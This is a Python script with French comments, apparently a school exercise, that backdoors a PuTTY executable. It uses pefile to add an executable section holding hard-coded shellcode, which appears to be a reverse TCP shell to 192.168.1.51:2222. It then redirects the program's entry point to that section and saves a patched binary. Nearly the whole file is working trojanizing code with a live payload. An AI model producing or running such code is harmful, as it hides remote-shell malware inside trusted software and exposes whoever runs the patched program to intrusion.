import pefile

shellcode = bytes  (b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                    b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                    b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
                    b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
                    b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
                    b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
                    b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
                    b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
                    b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
                    b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
                    b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
                    b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                    b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                    b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                    b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x33\x68"
                    b"\x02\x00\x08\xae\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                    b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                    b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                    b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
                    b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
                    b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
                    b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
                    b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                    b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
                    b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")



def adjust_SectionSize(size, align):
  if size % align: size = ((size + align) // align) * align
  return size

pe = pefile.PE('../puttySafe.exe')

# On créer un prototype de section en reprenant les mêmes attributs qu'une section présentes dans FILE_HEADER
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)

#NOMBRE DE SECTION TOTALES
number_sections = pe.FILE_HEADER.NumberOfSections -1
last_section = pe.sections[number_sections]

# On remplit chaque attributs de la section par des bytes vides.
new_section.__unpack__(bytearray(new_section.sizeof()))

# On se place au niveau de l'avant dernière section puis on ajoute 40 bytes (taille d'une section)
new_section.set_file_offset(pe.sections[number_sections].get_file_offset() + 40)

#On définit le nom de notre section
new_section.Name = b'.ESGI'

# SizeOfRawData : The section size value on the disk && VirtualSize : Size of the section in memory
new_section.SizeOfRawData = adjust_SectionSize(0x1000, pe.OPTIONAL_HEADER.FileAlignment)
new_section.Misc_VirtualSize = 0x1000
new_section.Misc = 0x1000
new_section.Misc_PhysicalAddress = 0x1000

# VirtualAdress & PointerToRawData : On doit faire attention de pas overwrite sur une section existante
new_section.VirtualAddress = last_section.VirtualAddress + adjust_SectionSize(last_section.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
new_section.PointerToRawData = len(pe.__data__)

# Characteristics : On met les flags suivants : droit en Lecture / Ecriture /  Execution / Et que cette section contient du code
new_section.Characteristics = 0xE0000020


###############################################################################

# On modifie le flag OEP pour qu'il commence à notre section
reljmp = pe.OPTIONAL_HEADER.AddressOfEntryPoint - (new_section.VirtualAddress + 5)
print('rel jmp %08x' % (reljmp))
new_section_data = bytearray(new_section.SizeOfRawData)
new_section_data[0:283] = shellcode


# On change le pe point d'entréer (EOP) vers notre nouvelle section
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

################################################################################

# AUGMENTER LE NOMBRE DE SECTIONS
pe.FILE_HEADER.NumberOfSections += 1

# On modifie la taille de SizeOfImage : elle doit etre egal à VirtualAddress + Virtual Size
pe.OPTIONAL_HEADER.SizeOfImage =  new_section.Misc_VirtualSize + new_section.VirtualAddress
#pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(0x1000, pe.OPTIONAL_HEADER.SectionAlignment)

# On ajoute la section aux structures de sections
pe.sections.append(new_section)
pe.__structures__.append(new_section)

# add new section data to file
pe.__data__ = bytearray(pe.__data__) + new_section_data

pe.write('../patched.exe')

print(new_section)

# Augmenter la taille de l'executable si besoin